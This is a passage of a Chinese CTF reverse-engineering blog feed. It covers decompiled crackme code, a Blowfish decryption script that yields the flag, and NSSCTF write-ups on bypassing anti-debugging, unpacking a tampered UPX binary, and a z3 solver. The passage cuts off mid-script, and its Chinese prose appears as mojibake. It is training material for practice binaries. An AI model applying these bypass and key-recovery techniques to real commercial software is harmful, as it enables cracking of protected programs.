<span class="number">0x10</span>u);</span><br><span class="line">    sub_45126F(lpString, WindowTextLengthA, (<span class="type">int</span>)v6, v10);</span><br><span class="line">    j_lastcall(v4);</span><br><span class="line">    j__free(lpString);</span><br><span class="line">    j__free(v6);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ¨è°ƒå¯çŸ¥ï¼šç¬¬ä¸€ä¸ªæ˜¯ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªæ˜¯å¯†ç </p><p>åŒ–ç®€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *password; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *username; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> lenOFpass; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> lenOFname; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  lenOFname = GetWindowTextLengthA(hWnd);</span><br><span class="line">  lenOFpass = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  username = (CHAR *)j__malloc(__CFADD__(lenOFname, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFname + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(lenOFpass, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFpass + <span class="number">16</span>);</span><br><span class="line">  password = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( username &amp;&amp; result )                     <span class="comment">// æ£€æŸ¥ç©ºæŒ‡é’ˆ</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, username, lenOFname + <span class="number">16</span>);<span class="comment">// ç”¨æˆ·å</span></span><br><span class="line">    GetWindowTextA(DlgItem, password, lenOFpass + <span class="number">16</span>);<span class="comment">// å¯†ç </span></span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);                        <span class="comment">// åˆ†é…å†…å­˜</span></span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);              <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;specialloc, <span class="number">0x10</span>u);             <span class="comment">// åˆå§‹åŒ–å¯¹è±¡</span></span><br><span class="line">    encode(username, lenOFname, (<span class="type">int</span>)password, lenOFpass);</span><br><span class="line">    j_lastcall(v4);                             <span class="comment">// åˆ¤æ–­</span></span><br><span class="line">    j__free(username);</span><br><span class="line">    j__free(password);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢å®åœ¨åˆ†æä¸å‡ºæ¥äº†ï¼Œé‡Œé¢æœ‰ä¸€äº›æ¶‰åŠc++çš„ç†è§£çš„,æ‰€ä»¥çœ‹çœ‹wp</p><p>åœ¨åé¢æœ‰åŠ å¯†å‡½æ•°ï¼Œç”¨æ’ä»¶findcryptå¯ä»¥ç›´æ¥çœ‹å‡ºæ¥æ˜¯blowfish</p><p>åœ¨cmpæ—¶ä¸‹æ–­ç‚¹buf1å°±æ˜¯æœ€åçš„å€¼</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11A51F049550E2508F17E16CF1632B47</span><br></pre></td></tr></table></figure><p>å†™blowfishçš„è§£å¯†ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†æ–‡ï¼ˆä»¥åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰</span></span><br><span class="line">ciphertext_hex = <span class="string">&quot;11A51F049550E2508F17E16CF1632B47&quot;</span></span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†é’¥ï¼ˆç®€å•å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">key = <span class="string">&quot;UzBtZTBuZV9EMGcz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºBlowfish ECBæ¨¡å¼çš„è§£å¯†å™¨</span></span><br><span class="line">cipher = Blowfish.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), Blowfish.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plaintext_bytes = cipher.decrypt(ciphertext)</span><br><span class="line">plaintext = plaintext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment">#QHRoZWJsdWVmMXNo</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç­”æ¡ˆæ˜¯ä¸ªbase64ï¼Œè§£å¯†åæ˜¯@thebluef1sh</p><p>ï¼ˆå’Œè“é²¸çš„å”¯ä¸€å…³ç³»å—ã€‚ã€‚ã€‚ï¼‰</p><p>æ‰€ä»¥</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">D0g3</span><span class="template-variable">&#123;UzBtZTBuZV9EMGczQHRoZWJsdWVmMXNo&#125;</span></span><br></pre></td></tr></table></figure><hr><p>å†™å®Œå•¦ï¼Œ</p><p>å¦‚æœ‰é”™è¯¯ï¼Œè¯·åœ¨ä¸‹æ–¹è¯„è®ºåŒºå†™ä¸‹æ‚¨çš„æƒ³æ³•ã€‚æ„Ÿè°¢ï¼</p><details class="folding-tag" ><summary> é¢˜ç›®ä¸‹è½½ </summary>              <div class='content'>              <div class="tag link"><a class="link-card" title="(ç™¾åº¦ç½‘ç›˜)" href="https://pan.baidu.com/s/1XAZU4ED-xjuUVUno-Kx81Q?pwd=Game"><div class="left"><img src="/assets/coffee.png"/></div><div class="right"><p class="text">(ç™¾åº¦ç½‘ç›˜)</p><p class="url">https://pan.baidu.com/s/1XAZU4ED-xjuUVUno-Kx81Q?pwd=Game</p></div></a></div><p>è§£å‹å¯†ç :</p><p>pRism</p>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜è®°å½•(2)</title>
      <link href="/posts/8f76d0c7.html"/>
      <url>/posts/8f76d0c7.html</url>
      
        <content type="html"><![CDATA[<h1>NSSCTF</h1><h2 id="NSSRound-4-SWPU-hide-and-seek">[NSSRound#4 SWPU]hide_and_seek</h2><p>æ‰“å¼€è°ƒè¯•åï¼Œå‘ç°æœ‰åè°ƒè¯•ï¼ŒæŠŠä¸€å¼€å§‹çš„exitç»™nopæ‰</p><p>ç„¶åè°ƒè¯•è·³åˆ°åé¢å‘ç°æœ‰flagï¼šSCTF{wud3_0n@,34p}</p><p>ä½†æ˜¯ç»“æœä¸å¯¹ï¼Ÿï¼Ÿ</p><p>å†æ¬¡è°ƒè¯•ï¼Œåœ¨hexè§†å›¾ä¸­alt+tæœç´¢NSSCTFï¼Œå‘ç°flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">NSSCTF</span><span class="template-variable">&#123;h1d3_0n_h34p&#125;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-X-Basic-ez-z3">[NSSRound#X Basic]ez_z3</h2><p>å…ˆç”¨dieæŸ¥å£³ï¼Œå‘ç°æ˜¯upxï¼Œå°è¯•ç”¨upx-dè„±å£³ï¼Œç„¶åå¤±è´¥ï¼Œåº”è¯¥æ˜¯æ”¹è¿‡ä»€ä¹ˆä¸œè¥¿ï¼Œæ‰“å¼€idaçœ‹çœ‹ï¼Œç»“æœå‘ç°èŠ‚åŒºåä»UPXå˜æˆäº†XYUï¼Œæ‰€ä»¥å°è¯•è¿˜åŸï¼Œè¿˜åŸåè¿˜æ˜¯å¤±è´¥ï¼Œåœ¨03E0å¤„è¿˜éœ€ä¿®æ”¹ä¸ºUPXï¼Œè¿™æ¬¡UPX-dæˆåŠŸï¼Œå‚è€ƒ<a href="https://www.52pojie.cn/thread-326995-1-1.html">UPXé˜²è„±å£³æœºè„±å£³ã€å»é™¤ç‰¹å¾ç ã€æ·»åŠ èŠ±æŒ‡ä»¤å°æ¢ - ã€è„±å£³ç ´è§£åŒºã€ - å¾çˆ±ç ´è§£ - LCG - LSG |å®‰å“ç ´è§£|ç—…æ¯’åˆ†æ|www.52pojie.cn</a></p><p>æ‰“å¼€idaæŸ¥çœ‹mainå‡½æ•°å¹¶å°è¯•è°ƒè¯•</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Please input the flag:<span class="number">1212121</span></span><br><span class="line">Can you calculated out z3?</span><br><span class="line">Please input z3:<span class="number">121212</span></span><br><span class="line">YOU are wrong</span><br><span class="line">oh no!!!!!your flag is wrong,try again</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°å¤§è‡´é€»è¾‘ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(std::cout, <span class="string">&quot;Please input the flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">getin</span>(std::cin, flag);</span><br><span class="line">  v3 = <span class="built_in">print</span>(std::cout, <span class="string">&quot;Can you calculated out z3?&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, guessNoUse);</span><br><span class="line">  <span class="built_in">print</span>(std::cout, <span class="string">&quot;Please input z3:&quot;</span>);</span><br><span class="line">  <span class="built_in">getin</span>(std::cin, z3num);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(flag); ++i )</span><br><span class="line">    storn[i] = <span class="built_in">change</span>(flag[i], exenum[i]);</span><br><span class="line">  <span class="built_in">z3check1</span>(z3num);</span><br><span class="line">  <span class="built_in">z3check2</span>(z3num);</span><br><span class="line">  check = <span class="built_in">sub_7FF7CCBC10E6</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( check == <span class="number">1</span> )</span><br><span class="line">    v4 = <span class="built_in">print</span>(std::cout, <span class="string">&quot;yeah!!!!!!you get the flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="built_in">print</span>(std::cout, <span class="string">&quot;oh no!!!!!your flag is wrong,try again&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, guessNoUse);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æµç¨‹å¤§è‡´æ˜¯å…ˆå¯¹flagå˜æ¢ä¸ºkï¼Œç„¶åæ£€æµ‹è¾“å…¥ä¸€ä¸ªz3åºåˆ—æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Œç„¶åè®©z3åºåˆ—å’Œkå˜æ¢ï¼Œæ£€æŸ¥æœ€åç»“æœ</p><p>é‚£ä¹ˆå…ˆæ‰¾åˆ°z3numï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ±‚è§£å™¨å®ä¾‹</span></span><br><span class="line">f = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ•´æ•°å˜é‡çš„æ•°ç»„ï¼Œç”¨äºå­˜å‚¨z3numä¸­çš„å€¼</span></span><br><span class="line">z3num = [Int(<span class="string">f&#x27;z3num[<span class="subst">&#123;i&#125;</span>]&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> z3num:</span><br><span class="line">    f.add(num &gt;= <span class="number">0</span>)</span><br><span class="line">    f.add(num &lt;= <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span class="number">17</span>] == <span class="number">2582239</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">11</span> * z3num[<span class="number">10</span>] * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>] * z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">12</span> * z3num[<span class="number">11</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - (<span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">      + <span class="number">17</span> * z3num[<span class="number">16</span>]) == <span class="number">2602741</span>)</span><br><span class="line">f.add(<span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">18</span> * z3num[<span class="number">17</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>] * <span class="number">13</span> * z3num[<span class="number">12</span>]</span><br><span class="line">     + <span class="number">12</span> * z3num[<span class="number">11</span>] * <span class="number">11</span> * z3num[<span class="number">10</span>]</span><br><span class="line">     + <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     + <span class="number">7</span> * z3num[<span class="number">6</span>] * <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     - <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>] * <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     - <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>] * <span class="number">16</span> * z3num[<span class="number">15</span>]</span><br><span class="line">     - <span class="number">20</span> * z3num[<span class="number">19</span>] == <span class="number">2668123</span>)</span><br><span class="line">f.add(<span class="number">20</span> * z3num[<span class="number">19</span>] * <span class="number">19</span> * z3num[<span class="number">18</span>]</span><br><span class="line">     + <span class="number">14</span> * z3num[<span class="number">13</span>]</span><br><span class="line">     + (<span class="number">13</span> * z3num[<span class="number">12</span>] + <span class="number">11</span> * z3num[<span class="number">10</span>] - <span class="number">12</span> * z3num[<span class="number">11</span>]) * <span class="number">10</span> * z3num[<span class="number">9</span>]</span><br><span class="line">     + <span class="number">30</span> * z3num[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">5</span> * z3num[<span class="number">4</span>]</span><br><span class="line">     + z3num[<span class="number">0</span>]</span><br><span class="line">     + <span class="number">2</span> * z3num[<span class="number">1</span>]</span><br><span class="line">     - <span class="number">3</span> * z3num[<span class="number">2</span>]</span><br><span class="line">     - <span class="number">4</span> * z3num[<span class="number">3</span>]</span><br><span class="line">     - <span class="number">7</span> * z3num[<span class="number">6</span>]</span><br><span class="line">     + <span class="number">8</span> * z3num[<span class="number">7</span>]</span><br><span class="line">     - <span class="number">9</span> * z3num[<span class="number">8</span>]</span><br><span class="line">     - <span class="number">16</span> * z3num[<span class="number">15</span>] * <span class="number">15</span> * z3num[<span class="number">14</span>]</span><br><span class="line">     - <span class="number">17</span> * z3num[<span class="number">16</span>]</span><br><span class="line">     - <span class="number">18</span> * z3num[<span 